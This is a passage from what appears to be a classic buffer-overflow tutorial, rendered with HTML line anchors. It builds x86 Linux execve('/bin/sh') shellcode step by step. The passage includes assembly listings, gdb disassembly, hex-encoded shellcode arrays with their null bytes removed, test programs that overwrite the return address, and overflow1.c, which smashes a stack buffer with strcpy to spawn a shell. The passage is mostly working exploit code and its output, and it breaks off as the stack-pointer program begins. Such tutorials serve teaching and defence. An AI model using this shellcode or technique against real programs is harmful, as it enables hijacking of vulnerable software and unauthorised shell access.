<a id=__codelineno-0-698 name=__codelineno-0-698 href=#__codelineno-0-698></a>        call   offset-to-popl           # 5 bytes
<a id=__codelineno-0-699 name=__codelineno-0-699 href=#__codelineno-0-699></a>        /bin/sh string goes here.
<a id=__codelineno-0-700 name=__codelineno-0-700 href=#__codelineno-0-700></a>------------------------------------------------------------------------------
<a id=__codelineno-0-701 name=__codelineno-0-701 href=#__codelineno-0-701></a>
<a id=__codelineno-0-702 name=__codelineno-0-702 href=#__codelineno-0-702></a>   Calculating the offsets from jmp to call, from call to popl, from
<a id=__codelineno-0-703 name=__codelineno-0-703 href=#__codelineno-0-703></a>the string address to the array, and from the string address to the null
<a id=__codelineno-0-704 name=__codelineno-0-704 href=#__codelineno-0-704></a>long word, we now have:
<a id=__codelineno-0-705 name=__codelineno-0-705 href=#__codelineno-0-705></a>
<a id=__codelineno-0-706 name=__codelineno-0-706 href=#__codelineno-0-706></a>------------------------------------------------------------------------------
<a id=__codelineno-0-707 name=__codelineno-0-707 href=#__codelineno-0-707></a>        jmp    0x26                     # 2 bytes
<a id=__codelineno-0-708 name=__codelineno-0-708 href=#__codelineno-0-708></a>        popl   %esi                     # 1 byte
<a id=__codelineno-0-709 name=__codelineno-0-709 href=#__codelineno-0-709></a>        movl   %esi,0x8(%esi)           # 3 bytes
<a id=__codelineno-0-710 name=__codelineno-0-710 href=#__codelineno-0-710></a>        movb   $0x0,0x7(%esi)       # 4 bytes
<a id=__codelineno-0-711 name=__codelineno-0-711 href=#__codelineno-0-711></a>        movl   $0x0,0xc(%esi)           # 7 bytes
<a id=__codelineno-0-712 name=__codelineno-0-712 href=#__codelineno-0-712></a>        movl   $0xb,%eax                # 5 bytes
<a id=__codelineno-0-713 name=__codelineno-0-713 href=#__codelineno-0-713></a>        movl   %esi,%ebx                # 2 bytes
<a id=__codelineno-0-714 name=__codelineno-0-714 href=#__codelineno-0-714></a>        leal   0x8(%esi),%ecx           # 3 bytes
<a id=__codelineno-0-715 name=__codelineno-0-715 href=#__codelineno-0-715></a>        leal   0xc(%esi),%edx           # 3 bytes
<a id=__codelineno-0-716 name=__codelineno-0-716 href=#__codelineno-0-716></a>        int    $0x80                    # 2 bytes
<a id=__codelineno-0-717 name=__codelineno-0-717 href=#__codelineno-0-717></a>        movl   $0x1, %eax       # 5 bytes
<a id=__codelineno-0-718 name=__codelineno-0-718 href=#__codelineno-0-718></a>        movl   $0x0, %ebx       # 5 bytes
<a id=__codelineno-0-719 name=__codelineno-0-719 href=#__codelineno-0-719></a>    int    $0x80            # 2 bytes
<a id=__codelineno-0-720 name=__codelineno-0-720 href=#__codelineno-0-720></a>        call   -0x2b                    # 5 bytes
<a id=__codelineno-0-721 name=__codelineno-0-721 href=#__codelineno-0-721></a>        .string \&quot;/bin/sh\&quot;     # 8 bytes
<a id=__codelineno-0-722 name=__codelineno-0-722 href=#__codelineno-0-722></a>------------------------------------------------------------------------------
<a id=__codelineno-0-723 name=__codelineno-0-723 href=#__codelineno-0-723></a>
<a id=__codelineno-0-724 name=__codelineno-0-724 href=#__codelineno-0-724></a>   Looks good. To make sure it works correctly we must compile it and run it.
<a id=__codelineno-0-725 name=__codelineno-0-725 href=#__codelineno-0-725></a>But there is a problem.  Our code modifies itself, but most operating system
<a id=__codelineno-0-726 name=__codelineno-0-726 href=#__codelineno-0-726></a>mark code pages read-only.  To get around this restriction we must place the
<a id=__codelineno-0-727 name=__codelineno-0-727 href=#__codelineno-0-727></a>code we wish to execute in the stack or data segment, and transfer control
<a id=__codelineno-0-728 name=__codelineno-0-728 href=#__codelineno-0-728></a>to it.  To do so we will place our code in a global array in the data
<a id=__codelineno-0-729 name=__codelineno-0-729 href=#__codelineno-0-729></a>segment.  We need first a hex representation of the binary code. Lets
<a id=__codelineno-0-730 name=__codelineno-0-730 href=#__codelineno-0-730></a>compile it first, and then use gdb to obtain it.
<a id=__codelineno-0-731 name=__codelineno-0-731 href=#__codelineno-0-731></a>
<a id=__codelineno-0-732 name=__codelineno-0-732 href=#__codelineno-0-732></a>shellcodeasm.c
<a id=__codelineno-0-733 name=__codelineno-0-733 href=#__codelineno-0-733></a>------------------------------------------------------------------------------
<a id=__codelineno-0-734 name=__codelineno-0-734 href=#__codelineno-0-734></a>void main() {
<a id=__codelineno-0-735 name=__codelineno-0-735 href=#__codelineno-0-735></a>__asm__(&quot;
<a id=__codelineno-0-736 name=__codelineno-0-736 href=#__codelineno-0-736></a>        jmp    0x2a                     # 3 bytes
<a id=__codelineno-0-737 name=__codelineno-0-737 href=#__codelineno-0-737></a>        popl   %esi                     # 1 byte
<a id=__codelineno-0-738 name=__codelineno-0-738 href=#__codelineno-0-738></a>        movl   %esi,0x8(%esi)           # 3 bytes
<a id=__codelineno-0-739 name=__codelineno-0-739 href=#__codelineno-0-739></a>        movb   $0x0,0x7(%esi)           # 4 bytes
<a id=__codelineno-0-740 name=__codelineno-0-740 href=#__codelineno-0-740></a>        movl   $0x0,0xc(%esi)           # 7 bytes
<a id=__codelineno-0-741 name=__codelineno-0-741 href=#__codelineno-0-741></a>        movl   $0xb,%eax                # 5 bytes
<a id=__codelineno-0-742 name=__codelineno-0-742 href=#__codelineno-0-742></a>        movl   %esi,%ebx                # 2 bytes
<a id=__codelineno-0-743 name=__codelineno-0-743 href=#__codelineno-0-743></a>        leal   0x8(%esi),%ecx           # 3 bytes
<a id=__codelineno-0-744 name=__codelineno-0-744 href=#__codelineno-0-744></a>        leal   0xc(%esi),%edx           # 3 bytes
<a id=__codelineno-0-745 name=__codelineno-0-745 href=#__codelineno-0-745></a>        int    $0x80                    # 2 bytes
<a id=__codelineno-0-746 name=__codelineno-0-746 href=#__codelineno-0-746></a>        movl   $0x1, %eax               # 5 bytes
<a id=__codelineno-0-747 name=__codelineno-0-747 href=#__codelineno-0-747></a>        movl   $0x0, %ebx               # 5 bytes
<a id=__codelineno-0-748 name=__codelineno-0-748 href=#__codelineno-0-748></a>        int    $0x80                    # 2 bytes
<a id=__codelineno-0-749 name=__codelineno-0-749 href=#__codelineno-0-749></a>        call   -0x2f                    # 5 bytes
<a id=__codelineno-0-750 name=__codelineno-0-750 href=#__codelineno-0-750></a>        .string \&quot;/bin/sh\&quot;             # 8 bytes
<a id=__codelineno-0-751 name=__codelineno-0-751 href=#__codelineno-0-751></a>&quot;);
<a id=__codelineno-0-752 name=__codelineno-0-752 href=#__codelineno-0-752></a>}
<a id=__codelineno-0-753 name=__codelineno-0-753 href=#__codelineno-0-753></a>------------------------------------------------------------------------------
<a id=__codelineno-0-754 name=__codelineno-0-754 href=#__codelineno-0-754></a>
<a id=__codelineno-0-755 name=__codelineno-0-755 href=#__codelineno-0-755></a>------------------------------------------------------------------------------
<a id=__codelineno-0-756 name=__codelineno-0-756 href=#__codelineno-0-756></a>[aleph1]$ gcc -o shellcodeasm -g -ggdb shellcodeasm.c
<a id=__codelineno-0-757 name=__codelineno-0-757 href=#__codelineno-0-757></a>[aleph1]$ gdb shellcodeasm
<a id=__codelineno-0-758 name=__codelineno-0-758 href=#__codelineno-0-758></a>GDB is free software and you are welcome to distribute copies of it
<a id=__codelineno-0-759 name=__codelineno-0-759 href=#__codelineno-0-759></a> under certain conditions; type &quot;show copying&quot; to see the conditions.
<a id=__codelineno-0-760 name=__codelineno-0-760 href=#__codelineno-0-760></a>There is absolutely no warranty for GDB; type &quot;show warranty&quot; for details.
<a id=__codelineno-0-761 name=__codelineno-0-761 href=#__codelineno-0-761></a>GDB 4.15 (i586-unknown-linux), Copyright 1995 Free Software Foundation, Inc...
<a id=__codelineno-0-762 name=__codelineno-0-762 href=#__codelineno-0-762></a>(gdb) disassemble main
<a id=__codelineno-0-763 name=__codelineno-0-763 href=#__codelineno-0-763></a>Dump of assembler code for function main:
<a id=__codelineno-0-764 name=__codelineno-0-764 href=#__codelineno-0-764></a>0x8000130 &lt;main&gt;:       pushl  %ebp
<a id=__codelineno-0-765 name=__codelineno-0-765 href=#__codelineno-0-765></a>0x8000131 &lt;main+1&gt;:     movl   %esp,%ebp
<a id=__codelineno-0-766 name=__codelineno-0-766 href=#__codelineno-0-766></a>0x8000133 &lt;main+3&gt;:     jmp    0x800015f &lt;main+47&gt;
<a id=__codelineno-0-767 name=__codelineno-0-767 href=#__codelineno-0-767></a>0x8000135 &lt;main+5&gt;:     popl   %esi
<a id=__codelineno-0-768 name=__codelineno-0-768 href=#__codelineno-0-768></a>0x8000136 &lt;main+6&gt;:     movl   %esi,0x8(%esi)
<a id=__codelineno-0-769 name=__codelineno-0-769 href=#__codelineno-0-769></a>0x8000139 &lt;main+9&gt;:     movb   $0x0,0x7(%esi)
<a id=__codelineno-0-770 name=__codelineno-0-770 href=#__codelineno-0-770></a>0x800013d &lt;main+13&gt;:    movl   $0x0,0xc(%esi)
<a id=__codelineno-0-771 name=__codelineno-0-771 href=#__codelineno-0-771></a>0x8000144 &lt;main+20&gt;:    movl   $0xb,%eax
<a id=__codelineno-0-772 name=__codelineno-0-772 href=#__codelineno-0-772></a>0x8000149 &lt;main+25&gt;:    movl   %esi,%ebx
<a id=__codelineno-0-773 name=__codelineno-0-773 href=#__codelineno-0-773></a>0x800014b &lt;main+27&gt;:    leal   0x8(%esi),%ecx
<a id=__codelineno-0-774 name=__codelineno-0-774 href=#__codelineno-0-774></a>0x800014e &lt;main+30&gt;:    leal   0xc(%esi),%edx
<a id=__codelineno-0-775 name=__codelineno-0-775 href=#__codelineno-0-775></a>0x8000151 &lt;main+33&gt;:    int    $0x80
<a id=__codelineno-0-776 name=__codelineno-0-776 href=#__codelineno-0-776></a>0x8000153 &lt;main+35&gt;:    movl   $0x1,%eax
<a id=__codelineno-0-777 name=__codelineno-0-777 href=#__codelineno-0-777></a>0x8000158 &lt;main+40&gt;:    movl   $0x0,%ebx
<a id=__codelineno-0-778 name=__codelineno-0-778 href=#__codelineno-0-778></a>0x800015d &lt;main+45&gt;:    int    $0x80
<a id=__codelineno-0-779 name=__codelineno-0-779 href=#__codelineno-0-779></a>0x800015f &lt;main+47&gt;:    call   0x8000135 &lt;main+5&gt;
<a id=__codelineno-0-780 name=__codelineno-0-780 href=#__codelineno-0-780></a>0x8000164 &lt;main+52&gt;:    das
<a id=__codelineno-0-781 name=__codelineno-0-781 href=#__codelineno-0-781></a>0x8000165 &lt;main+53&gt;:    boundl 0x6e(%ecx),%ebp
<a id=__codelineno-0-782 name=__codelineno-0-782 href=#__codelineno-0-782></a>0x8000168 &lt;main+56&gt;:    das
<a id=__codelineno-0-783 name=__codelineno-0-783 href=#__codelineno-0-783></a>0x8000169 &lt;main+57&gt;:    jae    0x80001d3 &lt;__new_exitfn+55&gt;
<a id=__codelineno-0-784 name=__codelineno-0-784 href=#__codelineno-0-784></a>0x800016b &lt;main+59&gt;:    addb   %cl,0x55c35dec(%ecx)
<a id=__codelineno-0-785 name=__codelineno-0-785 href=#__codelineno-0-785></a>End of assembler dump.
<a id=__codelineno-0-786 name=__codelineno-0-786 href=#__codelineno-0-786></a>(gdb) x/bx main+3
<a id=__codelineno-0-787 name=__codelineno-0-787 href=#__codelineno-0-787></a>0x8000133 &lt;main+3&gt;:     0xeb
<a id=__codelineno-0-788 name=__codelineno-0-788 href=#__codelineno-0-788></a>(gdb)
<a id=__codelineno-0-789 name=__codelineno-0-789 href=#__codelineno-0-789></a>0x8000134 &lt;main+4&gt;:     0x2a
<a id=__codelineno-0-790 name=__codelineno-0-790 href=#__codelineno-0-790></a>(gdb)
<a id=__codelineno-0-791 name=__codelineno-0-791 href=#__codelineno-0-791></a>.
<a id=__codelineno-0-792 name=__codelineno-0-792 href=#__codelineno-0-792></a>.
<a id=__codelineno-0-793 name=__codelineno-0-793 href=#__codelineno-0-793></a>.
<a id=__codelineno-0-794 name=__codelineno-0-794 href=#__codelineno-0-794></a>------------------------------------------------------------------------------
<a id=__codelineno-0-795 name=__codelineno-0-795 href=#__codelineno-0-795></a>
<a id=__codelineno-0-796 name=__codelineno-0-796 href=#__codelineno-0-796></a>testsc.c
<a id=__codelineno-0-797 name=__codelineno-0-797 href=#__codelineno-0-797></a>------------------------------------------------------------------------------
<a id=__codelineno-0-798 name=__codelineno-0-798 href=#__codelineno-0-798></a>char shellcode[] =
<a id=__codelineno-0-799 name=__codelineno-0-799 href=#__codelineno-0-799></a>    &quot;\xeb\x2a\x5e\x89\x76\x08\xc6\x46\x07\x00\xc7\x46\x0c\x00\x00\x00&quot;
<a id=__codelineno-0-800 name=__codelineno-0-800 href=#__codelineno-0-800></a>    &quot;\x00\xb8\x0b\x00\x00\x00\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80&quot;
<a id=__codelineno-0-801 name=__codelineno-0-801 href=#__codelineno-0-801></a>    &quot;\xb8\x01\x00\x00\x00\xbb\x00\x00\x00\x00\xcd\x80\xe8\xd1\xff\xff&quot;
<a id=__codelineno-0-802 name=__codelineno-0-802 href=#__codelineno-0-802></a>    &quot;\xff\x2f\x62\x69\x6e\x2f\x73\x68\x00\x89\xec\x5d\xc3&quot;;
<a id=__codelineno-0-803 name=__codelineno-0-803 href=#__codelineno-0-803></a>
<a id=__codelineno-0-804 name=__codelineno-0-804 href=#__codelineno-0-804></a>void main() {
<a id=__codelineno-0-805 name=__codelineno-0-805 href=#__codelineno-0-805></a>   int *ret;
<a id=__codelineno-0-806 name=__codelineno-0-806 href=#__codelineno-0-806></a>
<a id=__codelineno-0-807 name=__codelineno-0-807 href=#__codelineno-0-807></a>   ret = (int *)&amp;ret + 2;
<a id=__codelineno-0-808 name=__codelineno-0-808 href=#__codelineno-0-808></a>   (*ret) = (int)shellcode;
<a id=__codelineno-0-809 name=__codelineno-0-809 href=#__codelineno-0-809></a>
<a id=__codelineno-0-810 name=__codelineno-0-810 href=#__codelineno-0-810></a>}
<a id=__codelineno-0-811 name=__codelineno-0-811 href=#__codelineno-0-811></a>------------------------------------------------------------------------------
<a id=__codelineno-0-812 name=__codelineno-0-812 href=#__codelineno-0-812></a>------------------------------------------------------------------------------
<a id=__codelineno-0-813 name=__codelineno-0-813 href=#__codelineno-0-813></a>[aleph1]$ gcc -o testsc testsc.c
<a id=__codelineno-0-814 name=__codelineno-0-814 href=#__codelineno-0-814></a>[aleph1]$ ./testsc
<a id=__codelineno-0-815 name=__codelineno-0-815 href=#__codelineno-0-815></a>$ exit
<a id=__codelineno-0-816 name=__codelineno-0-816 href=#__codelineno-0-816></a>[aleph1]$
<a id=__codelineno-0-817 name=__codelineno-0-817 href=#__codelineno-0-817></a>------------------------------------------------------------------------------
<a id=__codelineno-0-818 name=__codelineno-0-818 href=#__codelineno-0-818></a>
<a id=__codelineno-0-819 name=__codelineno-0-819 href=#__codelineno-0-819></a>   It works! But there is an obstacle.  In most cases we&#39;ll be trying to
<a id=__codelineno-0-820 name=__codelineno-0-820 href=#__codelineno-0-820></a>overflow a character buffer.  As such any null bytes in our shellcode will be
<a id=__codelineno-0-821 name=__codelineno-0-821 href=#__codelineno-0-821></a>considered the end of the string, and the copy will be terminated.  There must
<a id=__codelineno-0-822 name=__codelineno-0-822 href=#__codelineno-0-822></a>be no null bytes in the shellcode for the exploit to work.  Let&#39;s try to
<a id=__codelineno-0-823 name=__codelineno-0-823 href=#__codelineno-0-823></a>eliminate the bytes (and at the same time make it smaller).
<a id=__codelineno-0-824 name=__codelineno-0-824 href=#__codelineno-0-824></a>
<a id=__codelineno-0-825 name=__codelineno-0-825 href=#__codelineno-0-825></a>           Problem instruction:                 Substitute with:
<a id=__codelineno-0-826 name=__codelineno-0-826 href=#__codelineno-0-826></a>           --------------------------------------------------------
<a id=__codelineno-0-827 name=__codelineno-0-827 href=#__codelineno-0-827></a>           movb   $0x0,0x7(%esi)                xorl   %eax,%eax
<a id=__codelineno-0-828 name=__codelineno-0-828 href=#__codelineno-0-828></a>       molv   $0x0,0xc(%esi)                movb   %eax,0x7(%esi)
<a id=__codelineno-0-829 name=__codelineno-0-829 href=#__codelineno-0-829></a>                                                movl   %eax,0xc(%esi)
<a id=__codelineno-0-830 name=__codelineno-0-830 href=#__codelineno-0-830></a>           --------------------------------------------------------
<a id=__codelineno-0-831 name=__codelineno-0-831 href=#__codelineno-0-831></a>           movl   $0xb,%eax                     movb   $0xb,%al
<a id=__codelineno-0-832 name=__codelineno-0-832 href=#__codelineno-0-832></a>           --------------------------------------------------------
<a id=__codelineno-0-833 name=__codelineno-0-833 href=#__codelineno-0-833></a>           movl   $0x1, %eax                    xorl   %ebx,%ebx
<a id=__codelineno-0-834 name=__codelineno-0-834 href=#__codelineno-0-834></a>           movl   $0x0, %ebx                    movl   %ebx,%eax
<a id=__codelineno-0-835 name=__codelineno-0-835 href=#__codelineno-0-835></a>                                                inc    %eax
<a id=__codelineno-0-836 name=__codelineno-0-836 href=#__codelineno-0-836></a>           --------------------------------------------------------
<a id=__codelineno-0-837 name=__codelineno-0-837 href=#__codelineno-0-837></a>
<a id=__codelineno-0-838 name=__codelineno-0-838 href=#__codelineno-0-838></a>   Our improved code:
<a id=__codelineno-0-839 name=__codelineno-0-839 href=#__codelineno-0-839></a>
<a id=__codelineno-0-840 name=__codelineno-0-840 href=#__codelineno-0-840></a>shellcodeasm2.c
<a id=__codelineno-0-841 name=__codelineno-0-841 href=#__codelineno-0-841></a>------------------------------------------------------------------------------
<a id=__codelineno-0-842 name=__codelineno-0-842 href=#__codelineno-0-842></a>void main() {
<a id=__codelineno-0-843 name=__codelineno-0-843 href=#__codelineno-0-843></a>__asm__(&quot;
<a id=__codelineno-0-844 name=__codelineno-0-844 href=#__codelineno-0-844></a>        jmp    0x1f                     # 2 bytes
<a id=__codelineno-0-845 name=__codelineno-0-845 href=#__codelineno-0-845></a>        popl   %esi                     # 1 byte
<a id=__codelineno-0-846 name=__codelineno-0-846 href=#__codelineno-0-846></a>        movl   %esi,0x8(%esi)           # 3 bytes
<a id=__codelineno-0-847 name=__codelineno-0-847 href=#__codelineno-0-847></a>        xorl   %eax,%eax                # 2 bytes
<a id=__codelineno-0-848 name=__codelineno-0-848 href=#__codelineno-0-848></a>    movb   %eax,0x7(%esi)       # 3 bytes
<a id=__codelineno-0-849 name=__codelineno-0-849 href=#__codelineno-0-849></a>        movl   %eax,0xc(%esi)           # 3 bytes
<a id=__codelineno-0-850 name=__codelineno-0-850 href=#__codelineno-0-850></a>        movb   $0xb,%al                 # 2 bytes
<a id=__codelineno-0-851 name=__codelineno-0-851 href=#__codelineno-0-851></a>        movl   %esi,%ebx                # 2 bytes
<a id=__codelineno-0-852 name=__codelineno-0-852 href=#__codelineno-0-852></a>        leal   0x8(%esi),%ecx           # 3 bytes
<a id=__codelineno-0-853 name=__codelineno-0-853 href=#__codelineno-0-853></a>        leal   0xc(%esi),%edx           # 3 bytes
<a id=__codelineno-0-854 name=__codelineno-0-854 href=#__codelineno-0-854></a>        int    $0x80                    # 2 bytes
<a id=__codelineno-0-855 name=__codelineno-0-855 href=#__codelineno-0-855></a>        xorl   %ebx,%ebx                # 2 bytes
<a id=__codelineno-0-856 name=__codelineno-0-856 href=#__codelineno-0-856></a>        movl   %ebx,%eax                # 2 bytes
<a id=__codelineno-0-857 name=__codelineno-0-857 href=#__codelineno-0-857></a>        inc    %eax                     # 1 bytes
<a id=__codelineno-0-858 name=__codelineno-0-858 href=#__codelineno-0-858></a>        int    $0x80                    # 2 bytes
<a id=__codelineno-0-859 name=__codelineno-0-859 href=#__codelineno-0-859></a>        call   -0x24                    # 5 bytes
<a id=__codelineno-0-860 name=__codelineno-0-860 href=#__codelineno-0-860></a>        .string \&quot;/bin/sh\&quot;             # 8 bytes
<a id=__codelineno-0-861 name=__codelineno-0-861 href=#__codelineno-0-861></a>                    # 46 bytes total
<a id=__codelineno-0-862 name=__codelineno-0-862 href=#__codelineno-0-862></a>&quot;);
<a id=__codelineno-0-863 name=__codelineno-0-863 href=#__codelineno-0-863></a>}
<a id=__codelineno-0-864 name=__codelineno-0-864 href=#__codelineno-0-864></a>------------------------------------------------------------------------------
<a id=__codelineno-0-865 name=__codelineno-0-865 href=#__codelineno-0-865></a>
<a id=__codelineno-0-866 name=__codelineno-0-866 href=#__codelineno-0-866></a>   And our new test program:
<a id=__codelineno-0-867 name=__codelineno-0-867 href=#__codelineno-0-867></a>
<a id=__codelineno-0-868 name=__codelineno-0-868 href=#__codelineno-0-868></a>testsc2.c
<a id=__codelineno-0-869 name=__codelineno-0-869 href=#__codelineno-0-869></a>------------------------------------------------------------------------------
<a id=__codelineno-0-870 name=__codelineno-0-870 href=#__codelineno-0-870></a>char shellcode[] =
<a id=__codelineno-0-871 name=__codelineno-0-871 href=#__codelineno-0-871></a>    &quot;\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b&quot;
<a id=__codelineno-0-872 name=__codelineno-0-872 href=#__codelineno-0-872></a>    &quot;\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd&quot;
<a id=__codelineno-0-873 name=__codelineno-0-873 href=#__codelineno-0-873></a>    &quot;\x80\xe8\xdc\xff\xff\xff/bin/sh&quot;;
<a id=__codelineno-0-874 name=__codelineno-0-874 href=#__codelineno-0-874></a>
<a id=__codelineno-0-875 name=__codelineno-0-875 href=#__codelineno-0-875></a>void main() {
<a id=__codelineno-0-876 name=__codelineno-0-876 href=#__codelineno-0-876></a>   int *ret;
<a id=__codelineno-0-877 name=__codelineno-0-877 href=#__codelineno-0-877></a>
<a id=__codelineno-0-878 name=__codelineno-0-878 href=#__codelineno-0-878></a>   ret = (int *)&amp;ret + 2;
<a id=__codelineno-0-879 name=__codelineno-0-879 href=#__codelineno-0-879></a>   (*ret) = (int)shellcode;
<a id=__codelineno-0-880 name=__codelineno-0-880 href=#__codelineno-0-880></a>
<a id=__codelineno-0-881 name=__codelineno-0-881 href=#__codelineno-0-881></a>}
<a id=__codelineno-0-882 name=__codelineno-0-882 href=#__codelineno-0-882></a>------------------------------------------------------------------------------
<a id=__codelineno-0-883 name=__codelineno-0-883 href=#__codelineno-0-883></a>------------------------------------------------------------------------------
<a id=__codelineno-0-884 name=__codelineno-0-884 href=#__codelineno-0-884></a>[aleph1]$ gcc -o testsc2 testsc2.c
<a id=__codelineno-0-885 name=__codelineno-0-885 href=#__codelineno-0-885></a>[aleph1]$ ./testsc2
<a id=__codelineno-0-886 name=__codelineno-0-886 href=#__codelineno-0-886></a>$ exit
<a id=__codelineno-0-887 name=__codelineno-0-887 href=#__codelineno-0-887></a>[aleph1]$
<a id=__codelineno-0-888 name=__codelineno-0-888 href=#__codelineno-0-888></a>------------------------------------------------------------------------------
<a id=__codelineno-0-889 name=__codelineno-0-889 href=#__codelineno-0-889></a>
<a id=__codelineno-0-890 name=__codelineno-0-890 href=#__codelineno-0-890></a>
<a id=__codelineno-0-891 name=__codelineno-0-891 href=#__codelineno-0-891></a>                              Writing an Exploit
<a id=__codelineno-0-892 name=__codelineno-0-892 href=#__codelineno-0-892></a>                              ~~~~~~~~~~~~~~~~~~
<a id=__codelineno-0-893 name=__codelineno-0-893 href=#__codelineno-0-893></a>                          (or how to mung the stack)
<a id=__codelineno-0-894 name=__codelineno-0-894 href=#__codelineno-0-894></a>                          ~~~~~~~~~~~~~~~~~~~~~~~~~~
<a id=__codelineno-0-895 name=__codelineno-0-895 href=#__codelineno-0-895></a>
<a id=__codelineno-0-896 name=__codelineno-0-896 href=#__codelineno-0-896></a>
<a id=__codelineno-0-897 name=__codelineno-0-897 href=#__codelineno-0-897></a>   Lets try to pull all our pieces together.  We have the shellcode.  We know
<a id=__codelineno-0-898 name=__codelineno-0-898 href=#__codelineno-0-898></a>it must be part of the string which we&#39;ll use to overflow the buffer.  We 
<a id=__codelineno-0-899 name=__codelineno-0-899 href=#__codelineno-0-899></a>know we must point the return address back into the buffer.  This example will
<a id=__codelineno-0-900 name=__codelineno-0-900 href=#__codelineno-0-900></a>demonstrate these points:
<a id=__codelineno-0-901 name=__codelineno-0-901 href=#__codelineno-0-901></a>
<a id=__codelineno-0-902 name=__codelineno-0-902 href=#__codelineno-0-902></a>overflow1.c
<a id=__codelineno-0-903 name=__codelineno-0-903 href=#__codelineno-0-903></a>------------------------------------------------------------------------------
<a id=__codelineno-0-904 name=__codelineno-0-904 href=#__codelineno-0-904></a>char shellcode[] =
<a id=__codelineno-0-905 name=__codelineno-0-905 href=#__codelineno-0-905></a>        &quot;\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b&quot;
<a id=__codelineno-0-906 name=__codelineno-0-906 href=#__codelineno-0-906></a>        &quot;\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd&quot;
<a id=__codelineno-0-907 name=__codelineno-0-907 href=#__codelineno-0-907></a>        &quot;\x80\xe8\xdc\xff\xff\xff/bin/sh&quot;;
<a id=__codelineno-0-908 name=__codelineno-0-908 href=#__codelineno-0-908></a>
<a id=__codelineno-0-909 name=__codelineno-0-909 href=#__codelineno-0-909></a>char large_string[128];
<a id=__codelineno-0-910 name=__codelineno-0-910 href=#__codelineno-0-910></a>
<a id=__codelineno-0-911 name=__codelineno-0-911 href=#__codelineno-0-911></a>void main() {
<a id=__codelineno-0-912 name=__codelineno-0-912 href=#__codelineno-0-912></a>  char buffer[96];
<a id=__codelineno-0-913 name=__codelineno-0-913 href=#__codelineno-0-913></a>  int i;
<a id=__codelineno-0-914 name=__codelineno-0-914 href=#__codelineno-0-914></a>  long *long_ptr = (long *) large_string;
<a id=__codelineno-0-915 name=__codelineno-0-915 href=#__codelineno-0-915></a>
<a id=__codelineno-0-916 name=__codelineno-0-916 href=#__codelineno-0-916></a>  for (i = 0; i &lt; 32; i++)
<a id=__codelineno-0-917 name=__codelineno-0-917 href=#__codelineno-0-917></a>    *(long_ptr + i) = (int) buffer;
<a id=__codelineno-0-918 name=__codelineno-0-918 href=#__codelineno-0-918></a>
<a id=__codelineno-0-919 name=__codelineno-0-919 href=#__codelineno-0-919></a>  for (i = 0; i &lt; strlen(shellcode); i++)
<a id=__codelineno-0-920 name=__codelineno-0-920 href=#__codelineno-0-920></a>    large_string[i] = shellcode[i];
<a id=__codelineno-0-921 name=__codelineno-0-921 href=#__codelineno-0-921></a>
<a id=__codelineno-0-922 name=__codelineno-0-922 href=#__codelineno-0-922></a>  strcpy(buffer,large_string);
<a id=__codelineno-0-923 name=__codelineno-0-923 href=#__codelineno-0-923></a>}
<a id=__codelineno-0-924 name=__codelineno-0-924 href=#__codelineno-0-924></a>------------------------------------------------------------------------------
<a id=__codelineno-0-925 name=__codelineno-0-925 href=#__codelineno-0-925></a>
<a id=__codelineno-0-926 name=__codelineno-0-926 href=#__codelineno-0-926></a>------------------------------------------------------------------------------
<a id=__codelineno-0-927 name=__codelineno-0-927 href=#__codelineno-0-927></a>[aleph1]$ gcc -o exploit1 exploit1.c
<a id=__codelineno-0-928 name=__codelineno-0-928 href=#__codelineno-0-928></a>[aleph1]$ ./exploit1
<a id=__codelineno-0-929 name=__codelineno-0-929 href=#__codelineno-0-929></a>$ exit
<a id=__codelineno-0-930 name=__codelineno-0-930 href=#__codelineno-0-930></a>exit
<a id=__codelineno-0-931 name=__codelineno-0-931 href=#__codelineno-0-931></a>[aleph1]$
<a id=__codelineno-0-932 name=__codelineno-0-932 href=#__codelineno-0-932></a>------------------------------------------------------------------------------
<a id=__codelineno-0-933 name=__codelineno-0-933 href=#__codelineno-0-933></a>
<a id=__codelineno-0-934 name=__codelineno-0-934 href=#__codelineno-0-934></a>   What we have done above is filled the array large_string[] with the
<a id=__codelineno-0-935 name=__codelineno-0-935 href=#__codelineno-0-935></a>address of buffer[], which is where our code will be.  Then we copy our
<a id=__codelineno-0-936 name=__codelineno-0-936 href=#__codelineno-0-936></a>shellcode into the beginning of the large_string string.  strcpy() will then
<a id=__codelineno-0-937 name=__codelineno-0-937 href=#__codelineno-0-937></a>copy large_string onto buffer without doing any bounds checking, and will
<a id=__codelineno-0-938 name=__codelineno-0-938 href=#__codelineno-0-938></a>overflow the return address, overwriting it with the address where our code
<a id=__codelineno-0-939 name=__codelineno-0-939 href=#__codelineno-0-939></a>is now located.  Once we reach the end of main and it tried to return it
<a id=__codelineno-0-940 name=__codelineno-0-940 href=#__codelineno-0-940></a>jumps to our code, and execs a shell.
<a id=__codelineno-0-941 name=__codelineno-0-941 href=#__codelineno-0-941></a>
<a id=__codelineno-0-942 name=__codelineno-0-942 href=#__codelineno-0-942></a>   The problem we are faced when trying to overflow the buffer of another
<a id=__codelineno-0-943 name=__codelineno-0-943 href=#__codelineno-0-943></a>program is trying to figure out at what address the buffer (and thus our
<a id=__codelineno-0-944 name=__codelineno-0-944 href=#__codelineno-0-944></a>code) will be.  The answer is that for every program the stack will
<a id=__codelineno-0-945 name=__codelineno-0-945 href=#__codelineno-0-945></a>start at the same address.  Most programs do not push more than a few hundred
<a id=__codelineno-0-946 name=__codelineno-0-946 href=#__codelineno-0-946></a>or a few thousand bytes into the stack at any one time.  Therefore by knowing
<a id=__codelineno-0-947 name=__codelineno-0-947 href=#__codelineno-0-947></a>where the stack starts we can try to guess where the buffer we are trying to
<a id=__codelineno-0-948 name=__codelineno-0-948 href=#__codelineno-0-948></a>overflow will be.  Here is a little program that will print its stack
<a id=__codelineno-0-949 name=__codelineno-0-949 href=#__codelineno-0-949></a>pointer:
<a id=__codelineno-0-950 name=__codelineno-0-950 href=#__codelineno-0-950></a>
<a id=__codelineno-0-951 name=__codelineno-0-951 href=#__codelineno-0-951></a>sp.c
<a id=__codelineno-0-952 name=__codelineno-0-952 href=#__codelineno-0-952></a>------------------------------------------------------------------------------
